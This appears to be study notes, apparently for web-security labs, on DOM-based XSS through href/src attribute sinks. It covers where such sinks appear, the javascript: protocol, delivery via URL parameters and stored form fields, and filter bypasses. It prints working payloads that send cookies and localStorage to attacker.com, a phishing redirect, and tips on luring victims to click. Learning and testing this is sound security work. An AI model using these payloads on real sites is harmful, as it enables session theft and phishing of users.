# DOM XSS — href / src Attribute Sink

## What it is
The page takes attacker-controlled input and writes it directly into an element's `href` or `src` attribute. Unlike `innerHTML`, you're not injecting HTML — you're controlling a URL value. The attack path is the `javascript:` protocol.

**Key trait:** No HTML injection needed. The browser natively executes `javascript:` as code when it appears in a URL attribute.

---

## Where to look

- "Back" links, "return to" links, redirect parameters
- Any link whose destination is built from URL params: `?returnUrl=`, `?redirect=`, `?next=`, `?returnPath=`, `?ref=`, `?continue=`, `?dest=`
- Profile links, avatar `src`, any dynamic `href`
- JS code containing `.attr('href', ...)`, `.prop('href', ...)`, `element.href =`, `element.src =`

**How to spot it in source:**
```javascript
$('#backLink').attr('href', params.get('returnPath'));
document.getElementById('link').href = location.search;
element.setAttribute('href', userInput);
```

---

## The javascript: protocol

`javascript:` tells the browser: run this as code, don't navigate.

```
javascript:alert(1)
javascript:alert(document.cookie)
javascript:fetch('https://attacker.com/?c='+document.cookie)
```

Works in any attribute the browser treats as a URL:
- `<a href="javascript:...">`
- `<iframe src="javascript:...">`
- `<object data="javascript:...">`
- `<form action="javascript:...">`

---

## Real-world payloads

```javascript
// Cookie theft
javascript:fetch('https://attacker.com/?c='+document.cookie)

// Cookie theft via image (no fetch)
javascript:new Image().src='https://attacker.com/?c='+document.cookie

// localStorage exfil
javascript:fetch('https://attacker.com/?d='+btoa(JSON.stringify(localStorage)))

// Redirect to phishing
javascript:location='https://evil-clone.com'
```

---

## Delivering the payload

### DOM context — URL parameter
Inject via the vulnerable URL parameter:
```
https://target.com/feedback?returnPath=javascript:fetch('https://attacker.com/?c='+document.cookie)
```

### Stored context — form fields
Some apps take user-supplied URLs (website field in comment forms, profile URLs, social links) and render them as clickable `<a href="...">` links. If double quotes are HTML-encoded, you can't break out — but you don't need to. Just supply a `javascript:` URL directly as the field value:

```
javascript:alert(document.cookie)
```

The app stores it, renders it inside the href, and anyone who clicks the author name/link executes your payload. This is **stored XSS** — it persists and affects every visitor, not just a crafted URL victim.

**Why double-quote encoding doesn't help here:** The app encodes `"` to prevent breaking out of the attribute, but `javascript:` doesn't need to break out — it's valid href content. The filter protects against the wrong attack vector.

**Important:** This requires the victim to click the link. Unlike `onerror`, `javascript:href` does not fire automatically — you need social engineering to get the click.

Strategies:
- Make the link look legitimate ("Back to Home", "Continue")
- Embed in a phishing email with a compelling reason to click
- Combine with UI redressing (clickjacking) if the page allows framing

---

## Filter bypasses

| Filter | Bypass |
|--------|--------|
| Blocks `javascript:` (lowercase) | `JaVaScRiPt:`, `JAVASCRIPT:` |
| Encodes `:` | Try double-encoding: `%253A` |
| Blocks `alert` | `confirm(1)`, `prompt(1)` |
| Strips `javascript` | `java&#9;script:` (tab char), `java\nscript:` |

---

## Key difference from onerror

| Payload | Fires automatically? | Requires interaction? |
|---------|---------------------|----------------------|
| `<img src=x onerror=...>` via innerHTML | Yes | No |
| `javascript:` in href/src | No | Yes — needs a click |

---

## Common mistakes

- Trying HTML injection into an href sink (`<img src=x onerror=...>`) — the browser treats it as a broken URL, not HTML
- Forgetting the victim needs to click — don't test as solved until you've actually clicked the link
- Not checking all redirect/return parameters — apps often have several (`returnUrl`, `next`, `redirect`, `ref`, `continue`)
